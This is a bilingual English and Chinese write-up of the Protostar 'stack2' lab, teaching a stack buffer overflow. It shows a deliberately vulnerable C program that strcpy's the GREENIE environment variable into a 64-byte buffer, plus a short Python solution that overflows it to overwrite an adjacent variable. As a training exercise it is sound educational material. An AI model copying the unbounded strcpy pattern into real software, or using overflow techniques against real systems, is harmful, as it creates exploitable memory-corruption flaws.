

## Source Code 源码

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## Notes

This question focuses on environment variable, which is a dynamic-named value that can affect the way running processes will behave. The function in C to get environment variables is **getenv()**. Here is the declaration.

`char* getenv (const char* name);`

The function **getenv()** retrieves a C-string containing the value of the environment variable whose name is specified as argument. If the requested variable is not part of the environment list, the function returns a null pointer.

According to the source code and the previous questions, it's easy to conclude that we should put a long string into the environment variable named **GREENIE** to cause the stack overflow vulnerability in function **strcpy()**. Thus, we can successfully modifiy the parameter **modified** in source code.

Debugging with GDB: `user@protostar:/opt/protostar/bin$ gdb -q stack1`
`(gdb) set disassembly-flavor intel`
`(gdb) disas main`

![main-assembly2](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/main-assembly2.png)

We can easily draw a memory graph accrording to the assembly code, but it's actually unnecessary. We have analized the overflow vulnerability above. Thus, we just need to put 64 characters and '**\x0a\x0d\x0a\x0d**' into the environment variable **GREENIE** in order to cover the value of variable **modified**.

## Solution

Different from the previous questions, we need to open python terminal to solve it.

`user@protostar:/opt/protostar/bin$ python`

```python
>>> import os
>>> envvar = 'a' * 64 + '\x0a\x0d\x0a\x0d'
>>> os.putenv('GREENIE', envvar)
>>> os.system('./stack2')
```

Result:

![result2](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/result2.png)

## 笔记

本题关注于环境变量，这是一个动态名称的值，可能会影响正在运行的进程的行为方式。 C语言中获取环境变量的函数是 **getenv()** ，定义为：

`char* getenv (const char* name);`

函数 **getenv()** 传入一串字符串，指定要获取的环境变量的名称。如果请求的变量不属于环境列表，则该函数返回空指针。

根据源代码和前面的题目，我们可以得出结论，应该在名为 **GREENIE** 的环境变量中放入一串比较长的字符串，从而导致函数 **strcpy()** 的栈溢出漏洞生效。 因此，我们可以成功修改源代码中的变量 **modified** 。

使用GDB调试：`user@protostar:/opt/protostar/bin$ gdb -q stack1`
`(gdb) set disassembly-flavor intel`
`(gdb) disas main`

![main-assembly2](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/main-assembly2.png)

我们可以根据以上汇编代码轻松画出内存情况图，但其实并无必要。我们已经分析了上面的溢出漏洞，因此，只需将64个字符和 '**\x0a\x0d\x0a\x0d**' 输入环境变量 **GREENIE** 中，即可覆盖源码变量 **modified** 的值。

## 结果

与前面的题目不同，我们需要打开 Python 终端来解决。

`user@protostar:/opt/protostar/bin$ python`

```python
>>> import os
>>> envvar = 'a' * 64 + '\x0a\x0d\x0a\x0d'
>>> os.putenv('GREENIE', envvar)
>>> os.system('./stack2')
```

结果：

![result2](https://github.com/HryMurph/Exploit-Exercise-Protostar/blob/master/Images/result2.png)

## Reference 参考

[tutorialspoint: C library function - getenv()](https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm)